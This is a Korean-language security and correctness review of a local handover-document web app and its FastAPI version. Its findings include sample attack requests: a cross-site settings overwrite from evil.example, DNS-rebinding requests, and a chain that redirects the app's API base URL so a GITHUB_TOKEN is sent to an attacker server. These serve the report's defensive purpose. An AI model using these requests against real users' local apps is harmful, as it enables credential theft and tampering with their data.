# 적대적 검증 보고서: baton-handover (참고 시제품)

- 대상: 사용자가 올린 `baton-handover.zip` (업무바통 참고 시제품, 파이썬 기본 웹서버 + `engine.py` 규칙 엔진)
- 일시: 2026-10-08, 검증 세션 `적대적 검증 및 개선`
- 방법: 스모크 테스트 실행, 코드 정독, 서버를 띄워 실제 요청 재현, 샘플과 다른 **새 모의자료**(도서관 업무, 동명이인·`10/31` 날짜·연도 넘김 포함)로 일반화 시험, 같은 자료를 현재 업무바통(`claude/trusting-curie-yplyec`, FastAPI 판)에도 돌려 대조
- 기본 상태: `tests/smoke_test.py` 7/7 통과, HWPX 내보내기는 zip·XML 구조 정상(`mimetype` 무압축 첫 항목)

각 항목은 **재현 결과**와 **업무바통 해당 여부**를 함께 적었다. "의도일 수 있음" 표시는 설계상 선택일 수 있어 반영 여부를 개발 쪽이 판단할 항목이다.

## A0. [업무바통 전용, 가장 높음] 아무 웹사이트에서나 설정 변경 가능(CSRF) — 재현됨
- baton-handover에는 없고 **현재 업무바통(FastAPI 판)에만 있는** 문제. 검증 중 대조하다 발견.
- `baton/server.py:78` `post_settings`가 `await req.json()`으로 본문을 읽는데, Starlette는 Content-Type을 검사하지 않는다. 브라우저는 `text/plain` POST를 사전 확인(preflight) 없이 다른 사이트에서도 보낸다.
- 재현: 사본 서버(8202)에 `Origin: https://evil.example`, `Content-Type: text/plain`, 본문 `{"org":"PWNED"}` → 200, `config/settings.json`에 `"org": "PWNED"` 저장됨.
- 영향: 사용자가 앱을 켜 둔 채 아무 웹페이지만 열어도 모델 프로필(`base_url`, `api_key_env` 제한 없음)을 바꿀 수 있음 → 저장된 API 키나 환경변수 값이 공격자 서버로 전송될 수 있음. 같은 방식으로 다른 `await req.json()` 경로(자료 넣기·삭제 등)도 확인 필요.
- 고칠 방법: 상태를 바꾸는 모든 요청에 대해 ① Content-Type `application/json` 강제, ② `Origin`이 있으면 허용 목록(localhost/127.0.0.1:포트)만, ③ Host 허용 목록(A1). 미들웨어 하나로 처리 가능.

## A. 보안 (높음)

### A1. DNS 리바인딩으로 외부 웹사이트가 로컬 앱을 조작·열람 가능 — 재현됨
- `core/server.py:104-121` `_foreign()`은 `Origin`의 호스트가 `Host` 헤더와 **같은지만** 본다. DNS 리바인딩 공격에서는 둘 다 공격자 도메인(`evil.example:8101`)이라 통과한다. GET은 아예 검사하지 않는다.
- 재현: `Host: evil.example:8101`, `Origin: http://evil.example:8101`로 `POST /api/handovers` → 200 생성 성공, `GET /api/handovers` → 목록(전임자 이름 등) 반환.
- 영향: 인수인계 자료(연락처·개인메모) 열람, 항목 수정·삭제, PC 임의 폴더 경로 읽기(`kind: local`), 그리고 A2.
- 고칠 방법: `Host` 헤더를 `localhost`/`127.0.0.1`/`[::1]`(+설정된 host) 허용 목록으로 검사하고, GET 포함 모든 `/api/*`에 적용.
- **업무바통 해당**: FastAPI 판도 Host 검사가 없음(`baton/server.py`). 같은 방식으로 TrustedHost 미들웨어(또는 직접 검사) 필요.

### A2. 환경변수 비밀값 유출 경로 — 코드상 확인
- `core/webcommon.py:202` API 키 환경변수 이름을 `*KEY*`/`*TOKEN*` 패턴으로만 제한 → `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY` 등 통과.
- A1과 결합: `POST /api/llm {provider:"openai", base_url:"http://공격자", api_key_env:"GITHUB_TOKEN"}` → `POST /api/llm/test` → `core/llm.py:76-78`이 `Authorization: Bearer <값>`을 공격자 서버로 전송.
- 고칠 방법: A1을 막는 것이 핵심. 추가로 환경변수 이름을 허용 목록(예: `LLM_API_KEY`, `OPENAI_API_KEY`)으로 좁히거나, 주소가 바뀌면 키 전송을 막음.
- **업무바통 해당(더 넓음)**: `POST /api/settings`가 프로필의 `api_key_env`·`base_url`을 **아무 제한 없이** 저장하고 `baton/llm.py:84`가 그대로 읽음. 저장된 `api_key`도 프로필 주소만 바뀐 채 재사용됨.

### A3. 문서시스템 주소 무검증(SSRF) — 낮음
- `app.py:84` `base_url`을 그대로 `urlopen`. 내부망 다른 서버 조회 가능. 로컬 도구라 낮음이지만 A1과 결합하면 내부망 탐색 통로가 됨. http(s)만 허용 정도면 충분.

## B. 기능 정확성 (중~높음)

### B1. 동명이인 연락처가 한 사람으로 합쳐짐 — 재현됨
- `engine.py:453-485` `merge_contacts`가 **이름만** 키로 합침.
- 재현(새 모의자료): "감리단 김민수 감리원(010-1111-2222)"과 "구청 문화체육과 김민수 주무관(02-555-1234)" → **한 명**으로 합쳐져 `김민수 감리원 / 구청 문화체육과 / 두 번호 / 감리단 메일`. 휴대·유선이 하나씩이라 충돌 표시도 안 뜸 → **조용히 틀린 연락처**.
- 한국 이름 특성상 실제로 자주 생김. 인수인계서에서 잘못된 번호는 치명적.
- 고칠 방법: 소속(org)·직위가 서로 다르고 둘 다 있으면 따로 두거나, 최소한 "동명이인일 수 있음" 확인 필요 표시.
- **업무바통 해당**: 같은 자료로 `extract()` 실행 시 `김민수 주무관/문화체육과`에 감리단 메일(`kms@gamri.example`)이 붙음. 같은 문제.

### B2. 현안 정렬이 연도를 무시 — 재현됨
- `engine.py:1080-1089` `_due_sort`가 (월, 일)만 사용 → `2027-01-15`가 `2026-11-20`보다 먼저 나옴.
- 고칠 방법: 연도 포함 정렬(연도 없으면 기준일 이후 가장 가까운 해로 가정).

### B3. `10/31` 같은 빗금 날짜·일부 행위어를 일정으로 못 잡음 — 재현됨
- "강사 계약은 10/31 만료" → 일정에 없음, 현안에는 "기한이 적혀 있지 않습니다"라고 **틀린** 누락 표시.
- "2027년 1월 초 연간 운영계획 수립해야 함" → 아무 데도 없음(`ACTIONS`에 '수립' 없음).
- "다음 주 화요일까지 …" → 기한 없음으로 표시(상대 날짜 미해석).
- 원인: 일정 추출이 `ACTIONS` 목록 단어가 있을 때만 동작(`engine.py:322-331`), `extract_dates`가 `M/D` 꼴 미지원.
- **업무바통 해당 안 됨**: 같은 자료에서 10/31, 1월 초 수립 모두 잡음(다만 연도가 비어 있음 → 정렬·기한 판정에 영향 가능, 확인 권장).

### B4. 기준일이 항상 '오늘' — 시연 결과가 날짜에 따라 바뀜 (의도일 수 있음)
- `engine.analyze(today=None)` → `date.today()`. API·화면에서 기준일을 정할 수 없음.
- 샘플 자료가 2026년 10월 기준이라, 심사일이 며칠만 달라도 '기한 지남' 개수·문구가 달라지고 2027년에 돌리면 대부분 '지난 일'이 됨.
- 고칠 방법: 화면/설정에 '기준일' 입력(기본 오늘), 샘플 시연 시 샘플 기준일 자동 제안.
- **업무바통**: `base_date` 인자가 있음. 화면에서 바꿀 수 있는지 확인 권장.

### B5. 질문 답변: 충돌을 알리지 않고, 자료에 없는 질문에 엉뚱한 근거를 나열
- "착공일 언제야?" → 11/3 메일과 계약표를 보여 주지만 **메모의 10/27과 충돌 중이라는 확인 필요 항목을 언급하지 않음**.
- "수영장 비밀번호 뭐야?" → "자료에 없음" 대신 수영장 관련 연락처·일정을 나열. 인수인계 도구에선 "자료에 없습니다 → 전임자에게 물어볼 질문으로 담기"가 맞음.
- 고칠 방법: 답 근거가 걸린 flag가 있으면 함께 표시, 질문 핵심어가 근거에 없으면 '없음' 응답.

### B6. 일회성 날짜가 '매월'로 바뀜 (경계 사례)
- `apply_cadence`가 "다음 정기검사: 2026. 10. 6. 예정"을 매월로 바꿔 "11월에 할 일" 답에 "매월 6일 … (기한 지남)"이 나옴. 실제 매월 업무는 "매월 10일까지 제출"이라 6일은 틀린 날짜.

## C. 실행 환경 (중)

### C1. 프록시 환경변수가 있는 PC에서 문서시스템 연계(자기 자신 호출)가 실패 — 재현됨
- `core/sources.py:392-394` `urlopen("http://127.0.0.1:…")`이 `HTTP_PROXY`를 따름. `no_proxy`가 없으면 프록시로 나가 시간 초과.
- 재현: `HTTP_PROXY=http://10.255.255.1:3128`로 127.0.0.1 호출 → `URLError timed out`.
- 공공기관 PC는 프록시 설정이 흔함. 로컬 주소(127.0.0.1/localhost)는 `ProxyHandler({})`로 직접 연결.
- **업무바통 해당**: `baton/server.py:268,273`, `baton/llm.py`(로컬 Ollama) 같은 구조.

### C2. 업로드가 지원하지 않는 파일까지 모두 base64로 읽음
- `core/static/common.js:76-86` 폴더 안 사진·동영상까지 브라우저 메모리에 base64(1.33배)로 올린 뒤 서버가 버림. 실제 업무 폴더(수 GB)에서 브라우저가 멈출 수 있음. 확장자로 먼저 거르고 크기 상한 안내.

## D. 입력 검증 (낮음)
- `POST /item`에 `months:["a"]` → 500. `POST /manual`에 `start:"bad"` → 500. 400 안내로 바꾸는 정도.
- 없는 `id`로 수정 요청 시 빈 항목이 새로 추가됨(`app.py:158-167`): 내용이 빈 새 항목은 거절.
- 메일 보낸 사람 이름에 `is_name` 검사 없음(`engine.py:384`) → "관리자 <admin@…>"가 연락처로 들어감.

## E. 확인했지만 문제 없음 (오탐 방지용 기록)
- 화면 XSS: `el()`이 textContent 사용, `rich()`는 먼저 escape → 파일명·원문에 태그가 있어도 안전.
- 업로드 경로 조작: `safe_parts` + resolve 검사로 `..`·드라이브 문자 차단됨.
- 저장소 경로: `Store.path` 루트 밖 접근 차단됨.
- HWPX 산출물 구조 정상.
- 모델 추출 검증(`verify_model_item`): 이름·번호·날짜·금액이 근거 원문에 없으면 버림. 완벽하진 않지만(문구 일부만 맞으면 통과) README 설명과 일치.
